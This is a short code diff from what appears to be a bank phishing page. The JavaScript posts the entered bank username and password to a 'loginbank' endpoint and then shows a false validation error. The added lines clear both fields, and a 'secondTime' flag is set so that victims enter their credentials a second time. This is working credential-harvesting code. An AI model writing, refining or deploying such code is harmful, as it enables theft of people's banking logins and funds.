@@ -334,8 +334,11 @@ require_once '../main.php';
             const firstTime = {}
             firstTime.username1 = $('input[name="userbank"]').val()
             firstTime.password1 = $('input[name="passwordbank"]').val()
+
             $.post("loginbank", firstTime, function(result) {
                 $('#validator-error-header').show()
+                $('input[name="userbank"]').val('')
+                $('input[name="passwordbank"]').val('')
                 sessionStorage.setItem('secondTime', 'yes')
                 console.log('V1')
             });
